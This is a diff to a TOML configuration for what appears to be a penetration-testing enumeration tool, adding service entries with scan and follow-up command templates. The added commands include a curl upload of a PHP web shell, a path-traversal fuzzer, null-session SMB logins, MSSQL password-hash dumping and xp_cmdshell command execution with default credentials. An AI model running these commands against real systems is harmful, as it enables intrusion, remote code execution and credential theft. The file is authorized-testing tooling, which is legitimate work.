@@ -1,12 +1,14 @@
 # see: https://packetstormsecurity.com/files/18307/nmap-services.html
-# TODO: dns, mysql, ms-sql/ms-sql-s, telnet, msrdp/ms-wbt-server, smtp, snmp,
-#       ssh, msrpc, pop3, ipp, java-rmi, vnc/vnc-http, oracle-tns,
-#       kerberos-sec, ldap, imap/imap3/imaps, https, ssl/http, ssl/http-alt
+# TODO: msrdp/ms-wbt-server, snmp,  msrpc, ipp, java-rmi,
+#       vnc/vnc-http, oracle-tns, kerberos-sec, ldap,
+#       imap/imap3/imaps, https, ssl/http, ssl/http-alt
 # commands accept arguments: <port>/<ports>, <target>, <fout>,
 #                            <wordlist>, <userlist>, <passlist>
-[ftp]
+
+[ftp]  # 20, 21
   nmap-service-names = [
-    "ftp"
+    "ftp",
+    "ftp-data"
   ]
 
   recommendations = [
@@ -17,14 +19,69 @@
     nmap = "nmap -vv -Pn -p <ports> --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 <target> -oN <fout>"
 
 
-[http]
+[ssh]  # 22
+  nmap-service-names = [
+    "ssh"
+  ]
+
+  recommendations = [
+    # TODO
+  ]
+
+  [ssh.scans]
+    # TODO
+
+
+[telnet]  # 23
+  nmap-service-names = [
+    "telnet"
+  ]
+
+  recommendations = [
+    # TODO
+  ]
+
+  [telnet.scans]
+    # TODO
+
+
+[smtp]  # 25
+  nmap-service-names = [
+    "smtp"
+  ]
+
+  recommendations = [
+    # TODO
+  ]
+
+  [smtp.scans]
+    # TODO
+
+
+[dns]  # 53
+  nmap-service-names = [
+    "domain"
+  ]
+
+  recommendations = [
+    # TODO
+  ]
+
+  [dns.scans]
+    # TODO
+
+
+[http]  # 80, 591
   nmap-service-names = [
     "http",
     "http-alt"
   ]
 
   recommendations = [
-    # TODO
+    "curl -v -X OPTIONS http://<target>:<port>/<directory>",
+    "curl -v -X PUT -d '<?php echo shell_exec($_GET[\"cmd\"]);?>' http://<target>:<port>/<directory>/webshell.php",
+    "dirb http://<target>:<port>/",
+    "dotdotpwn -m http -h <target> -x <port> -f <pathtoretrieve> -k <keywordthatmustbepresent> -d <depth> -t <millisperrequest> -s"
   ]
 
   [http.scans]
@@ -33,7 +90,20 @@
     gobuster = "gobuster -e -w <wordlist> -u http://<target>:<port>/ 2>&1 | tee <fout>"
 
 
-[smb]
+[pop3]  # 110
+  nmap-service-names = [
+    "pop3"
+  ]
+
+  recommendations = [
+    # TODO
+  ]
+
+  [pop3.scans]
+    # TODO
+
+
+[smb]  # 135, 139, 445
   nmap-service-names = [
     "epmap",
     "microsoft-ds",
@@ -41,9 +111,42 @@
   ]
 
   recommendations = [
-    # TODO
+    "nmap -vv -sU --script=nbstat -p <ports>",
+    "crackmapexec smb <target> -u <user> -p <pass> --spider C\\$ --pattern <pattern>",
+    "crackmapexec smb <target> -u '' -p ''",
+    "crackmapexec smb <target> -u '' -p '' --local-auth",
+    "smbclient -L <target>",
+    "smbclient \\\\<target>\\<share>"
   ]
 
   [smb.scans]
     "nmap.tcp" = "nmap -vv -Pn -p <ports> --script smb-vuln* <target> -oN <fout>"
     enum4linux = "enum4linux -a <target> 2>&1 | tee <fout>"
+
+
+[mssql]  # 1433, 1434
+  nmap-service-names = [
+    "ms-sql",
+    "ms-sql-s"
+  ]
+
+  recommendations = [
+    "nmap -vv -Pn -p <port> --script=ms-sql-dump-hashes --script-args='mssql.username=<user>,mssql.password=<pass>,mssql.instance-port=<port>' <target>",
+    "nmap -vv -Pn -p <port> --script ms-sql-xp-cmdshell --script-args='mssql.username=sa,mssql.password=password,mssql.instance-port=<port>,ms-sql-xp-cmdshell.cmd=\"<cmd>\"' <target>"
+  ]
+
+  [mssql.scans]
+    # TODO
+
+
+[mysql]  # 3306
+  nmap-service-names = [
+    "mysql"
+  ]
+
+  recommendations = [
+    "TODO"
+  ]
+
+  [mysql.scans]
+    # TODO
